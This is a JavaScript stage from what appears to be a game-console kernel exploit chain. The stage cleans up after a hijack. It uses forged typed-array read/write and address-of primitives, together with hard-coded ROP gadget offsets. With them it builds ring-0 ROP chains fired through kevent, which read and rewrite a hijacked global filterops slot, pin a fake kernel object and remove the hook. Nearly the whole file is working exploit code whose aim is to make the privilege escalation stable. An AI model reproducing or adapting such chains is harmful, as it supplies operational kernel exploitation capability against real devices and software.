// Stage SAFEDOWN v1: put the global sysfilt_ops slot back before anything
// else runs.
//
// The F stage rotates a fake `struct filterops` (living in our user-mapped
// page at fake+0xC00) into the kernel's global sysfilt_ops registry slot
// kbase+0x1a312b0. That is what gives us the ring-0 ROP primitive: every
// EV_ADD -23 on any kqueue goes through our fake f_touch.
//
// It is also a *global* kernel pointer into a *single process's* user page.
// Any other process that uses that filter - SceShellUI, the library, the
// notification panel, anything that touches a kqueue - makes the kernel read
// the fake filterops at an address that is unmapped in that process, which is
// a kernel page fault and a power-off. That is the crash: it needs only the
// chain (boot 27, no HEN), and it is independent of the kexec body, the
// guard patches and sysent[11] - which is exactly what the library tests
// showed.
//
// The reference Hx1400 implementation does this in safeDown(): pin the fake object, restore
// *(kbase+R_SLOT) = kbase+R_OPS with one last ROP chain, delete the knote and
// close the bridge kqueue, then quarantine the sockets. This port never did
// that. This probe does the two essential parts.
//
// The restore must be the LAST ROP action: once the slot holds kbase+R_OPS,
// EV_ADD -23 resolves to the real filterops and the fake f_touch is no longer
// reachable. So the probe proves the hook was live, reads the slot, writes it
// back, then proves the hook is gone by firing one more chain and requiring
// the MARK to stay zero.
var result, n, f, dv, saved, phase = "preflight";
var st = null, fake = 0, ops = 0, gSTACK = 0, gRES = 0, gMARK = 0, gCTX = 0;
var gDUMP = 0;
var forged = null, carrier = null, carrierSlot = -1, carrierOriginal = null;
var KBASE_LO = 0;
var R_SLOT = 0x1a312b0, R_OPS = 0x152a108;
var R_RET0 = 0x349ee, R_TOUCH = 0x73e886;
var R_POPRSP = 0x1c9dc, R_SAVE = 0x2be040, R_REST = 0x2be070;
var R_CONT = 0xe4f40, R_PRAX = 0x1ca05, R_PRDX = 0x184ab2;
var R_PRDI = 0x3b0a2a, R_LDRAX = 0x6aaf3, R_ADDRAX = 0x3fc327;
var R_STRAXRDX = 0x2e3d59, R_STRDIRAX = 0x2f1cb;
var Z8 = [0, 0, 0, 0, 0, 0, 0, 0];
var MARK = [49, 74, 84, 79, 79, 82, 77, 77];
var GIDENT = [49, 90, 84, 82, 80, 75, 52, 49];
var M120 = [136, 255, 255, 255, 255, 255, 255, 255];
try {
  n = window.__fw14NativeInvoke;
  var state = window.__fw14ArrayState;
  if (!n || !n.frame || !n.wrappers || !Number.isSafeInteger(n.frameAddress) ||
      !state || state.array[0] !== state.a || !state.view ||
      !state.ownedTypedView || !Number.isSafeInteger(state.calibratedViewBase) ||
      !Number.isInteger(state.index))
    throw new Error("caller_missing");
  st = window.__fw14StageF;
  if (!st || typeof st.fake !== "number" || typeof st.ops !== "number" ||
      typeof st.gSTACK !== "number" || typeof st.gMARK !== "number" ||
      typeof st.gCTX !== "number")
    throw new Error("stage_f_state_missing");
  KBASE_LO = st.kbaseLo || window.__fw14KbaseLo;
  if (!Number.isInteger(KBASE_LO) || KBASE_LO <= 0 || KBASE_LO > 0xffffffff)
    throw new Error("kbase_missing");
  var need = ["kevent", "kqueue", "close", "getpid"];
  var missing = [];
  for (var mi = 0; mi < need.length; mi++)
    if (typeof n.wrappers[need[mi]] !== "number") missing.push(need[mi]);
  if (missing.length) throw new Error("wrappers_missing:" + missing.join(","));
  f = n.frame;
  if (f.length < 0x9020) throw new Error("frame_short");
  dv = new DataView(f.buffer, f.byteOffset, f.byteLength);
  saved = Array.from(f.subarray(0x200, 0x1000));

  fake = st.fake;
  ops = st.ops;
  gSTACK = st.gSTACK;
  gRES = st.gRES;
  gMARK = st.gMARK;
  gCTX = st.gCTX;
  gDUMP = st.gDUMP || (fake + 6400);

  forged = state.view;
  carrier = state.ownedTypedView;
  var base = state.calibratedViewBase;
  function bytesAt(index, count) {
    var out = [];
    for (var i = 0; i < count; i++) out.push(forged[index + i]);
    return out;
  }
  function valueOf(bytes) {
    var v = 0;
    for (var i = bytes.length - 1; i >= 0; i--) v = v * 256 + bytes[i];
    return v;
  }
  function pointerBytes(value) {
    var out = [];
    for (var i = 0; i < 8; i++)
      out.push(Math.floor(value / Math.pow(2, i * 8)) & 255);
    return out;
  }
  function addressOf(object) {
    try {
      state.array[0] = object;
      return valueOf(bytesAt(state.index, 8));
    } finally {
      state.array[0] = state.a;
    }
  }
  carrierSlot = addressOf(carrier) - base + 8;
  if (!Number.isSafeInteger(carrierSlot) || carrierSlot < 0 ||
      carrierSlot + 8 >= 16777216)
    throw new Error("carrier_slot_invalid");
  carrierOriginal = bytesAt(carrierSlot, 8);
  function setCarrier(addr) {
    var next = pointerBytes(addr);
    for (var i = 0; i < 8; i++) forged[carrierSlot + i] = next[i];
  }
  function restoreCarrier() {
    for (var i = 0; i < 8; i++)
      forged[carrierSlot + i] = carrierOriginal[i];
  }
  function poke(addr, bytes) {
    setCarrier(addr);
    for (var i = 0; i < bytes.length; i++) carrier[i] = bytes[i];
    restoreCarrier();
  }
  function peek(addr, count) {
    setCarrier(addr);
    var out = [];
    for (var i = 0; i < count; i++) out.push(carrier[i]);
    restoreCarrier();
    return out;
  }
  function pokeQ(addr, bytes) { poke(addr, bytes); }
  function peekQ(addr) { return peek(addr, 8); }
  function pokeU32(addr, value) {
    poke(addr, [value & 255, (value >>> 8) & 255,
                (value >>> 16) & 255, (value >>> 24) & 255]);
  }
  function zero(addr, count) {
    var z = [];
    for (var i = 0; i < count; i++) z.push(0);
    poke(addr, z);
  }
  function same(left, right) {
    if (!left || !right || left.length !== right.length) return false;
    for (var i = 0; i < left.length; i++)
      if (left[i] !== (right[i] & 255)) return false;
    return true;
  }
  function kq(rva) {
    var lo = KBASE_LO + rva;
    if (lo > 0xffffffff) throw new Error("kva_overflow_" + rva);
    return [lo & 255, (lo >>> 8) & 255, (lo >>> 16) & 255,
            (lo >>> 24) & 255, 0xff, 0xff, 0xff, 0xff];
  }
  function u64b(value) { return pointerBytes(value); }
  function isBytes(v) { return v && typeof v === "object" && v.length === 8; }
  function isErr(r) {
    return !!r && r.value === -1 && (r.high >>> 0) === 0xffffffff;
  }
  function eTag(r) {
    if (!isErr(r)) return "v" + r.value;
    var e = n.readErrno();
    return "e" + (e === null ? r.value : e);
  }
  function hex16(bytes) {
    var out = "";
    for (var i = 7; i >= 0; i--)
      out += ("0" + (bytes[i] & 255).toString(16)).slice(-2);
    return out;
  }
  function mark(m) {
    if (typeof api !== "undefined" && api && typeof api.markSync === "function")
      api.markSync(m);
  }

  var pidRes = n.call("getpid", []);
  if (pidRes.high !== 0 || pidRes.value < 1 || pidRes.value > 100000)
    throw new Error("pid_invalid");
  var pid = pidRes.value;

  // ------------------------------------------- re-install fake filterops
  phase = "ops";
  pokeQ(ops, Z8);
  pokeQ(ops + 8, kq(R_RET0));
  pokeQ(ops + 16, kq(R_RET0));
  pokeQ(ops + 24, kq(R_RET0));
  pokeQ(ops + 32, kq(R_TOUCH));
  var opsOk = same(peekQ(ops + 32), kq(R_TOUCH));

  // ------------------------------------------------ kqueue + initial add
  phase = "kqueue";
  var kqRes = n.call("kqueue", []);
  if (kqRes.value < 0) throw new Error("kqueue" + eTag(kqRes));
  var kqFd = kqRes.value;

  f.fill(0, 0x900, 0x940);
  for (var gi = 0; gi < 8; gi++) f[0x900 + gi] = GIDENT[gi];
  dv.setInt16(0x908, -23, true);
  dv.setUint16(0x90a, 1, true);
  phase = "initial_add";
  mark("sd_initial_add");
  var addRes = n.call("kevent",
    [kqFd, n.frameAddress + 0x900, 1, 0, 0, 0]);

  // ------------------------------------------------------- chain builder
  function makeChain(extra) {
    var chain = [];
    function emit(b) { chain.push(b); }
    function emitU(v) { emit(isBytes(v) ? v : u64b(v)); }
    function kb1() {
      emit(kq(R_PRAX)); emit(MARK);
      emit(kq(R_PRDI)); emitU(gMARK);
      emit(kq(R_STRDIRAX)); emitU(0);
      emit(kq(R_PRAX)); emitU(gCTX + 16);
      emit(kq(R_LDRAX)); emitU(0);
      emit(kq(R_PRDX)); emit(M120);
      emit(kq(R_ADDRAX)); emitU(0);
      emit(kq(R_PRDI)); emitU(gCTX + 8);
      emit(kq(R_STRDIRAX)); emitU(0);
      emit(kq(R_PRAX)); emit(kq(R_CONT));
      emit(kq(R_PRDI)); emitU(gCTX + 56);
      emit(kq(R_STRDIRAX)); emitU(0);
      emit(kq(R_PRDI)); emitU(gCTX);
      emit(kq(R_REST));
    }
    emit(kq(R_PRDI)); emitU(gCTX); emit(kq(R_SAVE));
    extra(emit, emitU);
    kb1();
    var bytes = [];
    for (var qi = 0; qi < chain.length; qi++)
      for (var bi = 0; bi < 8; bi++) bytes.push(chain[qi][bi]);
    if (chain.length > 112) throw new Error("chain_long_" + chain.length);
    return { bytes: bytes, qwords: chain.length };
  }
  function fire(chain) {
    poke(gSTACK, chain.bytes);
    pokeQ(gMARK, Z8);
    f.fill(0, 0x900, 0x940);
    for (var gi2 = 0; gi2 < 8; gi2++) f[0x900 + gi2] = GIDENT[gi2];
    dv.setInt16(0x908, -23, true);
    dv.setUint16(0x90a, 1, true);
    var poprsp = kq(R_POPRSP);
    for (var pi = 0; pi < 8; pi++) f[0x920 + pi] = poprsp[pi];
    var stackB = u64b(gSTACK);
    for (var si = 0; si < 8; si++) f[0x928 + si] = stackB[si];
    var rc = n.call("kevent",
      [kqFd, n.frameAddress + 0x900, 2, 0, 0, 0]);
    return { rc: rc, mark: same(peekQ(gMARK), MARK), qwords: chain.qwords };
  }
  function readStep(emit, emitU, src, dst) {
    emit(kq(R_PRAX)); emitU(src);
    emit(kq(R_LDRAX)); emitU(0);
    emit(kq(R_PRDI)); emitU(dst);
    emit(kq(R_STRDIRAX)); emitU(0);
  }
  function writeStep(emit, emitU, addr, bytes) {
    emit(kq(R_PRAX)); emitU(addr);
    emit(kq(R_PRDX)); emit(bytes);
    emit(kq(R_STRAXRDX)); emitU(0);
  }

  // ------------------------------------------- 1. prove the hook is live
  phase = "probe";
  mark("sd_probe");
  var mRes = fire(makeChain(function () {}));
  var live = mRes.mark;

  // ------------------------------------------- 2. read the slot value
  var slot = Z8, slotOk = false;
  if (live) {
    phase = "read_slot";
    mark("sd_read_slot");
    var rRes = fire(makeChain(function (emit, emitU) {
      readStep(emit, emitU, kq(R_SLOT), gDUMP);
    }));
    slot = peekQ(gDUMP);
    slotOk = rRes.mark && same(slot, u64b(ops));
  }

  // ------------------------------------------- 3. restore the slot
  // This is the last ROP chain of the boot. Writing kbase+R_OPS back makes
  // the global registry point at the real filterops again, so no other
  // process can ever dereference our user page from kernel mode.
  var restored = false;
  if (slotOk) {
    phase = "restore";
    mark("sd_restore");
    var wRes = fire(makeChain(function (emit, emitU) {
      writeStep(emit, emitU, kq(R_SLOT), kq(R_OPS));
    }));
    restored = wRes.mark;
  }

  // ------------------------------------------- 4. prove the hook is gone
  // With the real filterops back in the slot, EV_ADD -23 must no longer
  // pivot: the MARK word has to stay zero. This is the verification that
  // the write actually landed.
  var dead = false, deadFired = false;
  if (restored) {
    phase = "verify_dead";
    mark("sd_verify_dead");
    var dRes = fire(makeChain(function () {}));
    deadFired = true;
    dead = !dRes.mark;
  }

  // ------------------------------------------- 5. pin + quarantine
  // Mirrors Hx1400 safeDown: pin the fake object so the kernel can never
  // free it, empty the fake tree so nothing walks it, and leave the fake
  // filterops struct itself intact - existing knotes still point at it and
  // their f_detach is R_RET0 (a plain ret), so teardown stays harmless.
  phase = "pin";
  if (restored) {
    pokeU32(fake + 56, 0x40000000);
    pokeQ(fake + 80, Z8);
    pokeQ(fake + 88, Z8);
    zero(fake + 2304, 96);
    zero(fake + 2560, 96);
  }

  // ------------------------------------------- 6. drop the knote + kqueue
  var delTag = "-", closeTag = "-";
  if (restored) {
    phase = "delete_knote";
    f.fill(0, 0x900, 0x940);
    for (var di = 0; di < 8; di++) f[0x900 + di] = GIDENT[di];
    dv.setInt16(0x908, -23, true);
    dv.setUint16(0x90a, 2, true);       // EV_DELETE
    var dk = n.call("kevent",
      [kqFd, n.frameAddress + 0x900, 1, 0, 0, 0]);
    delTag = eTag(dk);
    phase = "close_kqueue";
    var ck = n.call("close", [kqFd]);
    closeTag = eTag(ck);
  }

  // ------------------------------------------------------- outcome
  phase = "outcome";
  for (var ri = 0; ri < saved.length; ri++) f[0x200 + ri] = saved[ri];
  saved = null;
  var post = n.call("getpid", []);
  var intact = post.value === pid && post.high === 0 &&
    state.array[0] === state.a &&
    bytesAt(carrierSlot, 8).join(",") === carrierOriginal.join(",");

  var pass = live && slotOk && restored && dead && intact;
  window.__fw14SafeDown = {
    done: pass, slot: hex16(slot), ops: ops, kbaseLo: KBASE_LO, pid: pid
  };
  result = {
    id: "stage_safedown_v1",
    status: pass ? "pass" : "fail",
    details: {
      pid: pid,
      ops: (opsOk ? "ok" : "bad") + "/kq" + kqFd + "/add" + eTag(addRes),
      live: live ? "yes" : "no",
      slot: hex16(slot),
      want: hex16(u64b(ops)),
      restore: restored ? "ok" : "no",
      dead: deadFired ? (dead ? "yes" : "no") : "-",
      del: delTag,
      close: closeTag,
      state: pass ? "restored" : (restored ? "partial" : "armed"),
      intact: intact
    }
  };
} catch (e) {
  result = {
    id: "stage_safedown_v1",
    status: "error",
    details: { phase: phase, error: String(e).slice(0, 220) }
  };
} finally {
  try { if (forged && carrierSlot >= 0 && carrierOriginal)
    for (var ci = 0; ci < 8; ci++)
      forged[carrierSlot + ci] = carrierOriginal[ci]; } catch (ignore) {}
  if (f && saved)
    for (var fi = 0; fi < saved.length; fi++) f[0x200 + fi] = saved[fi];
}
return [result];
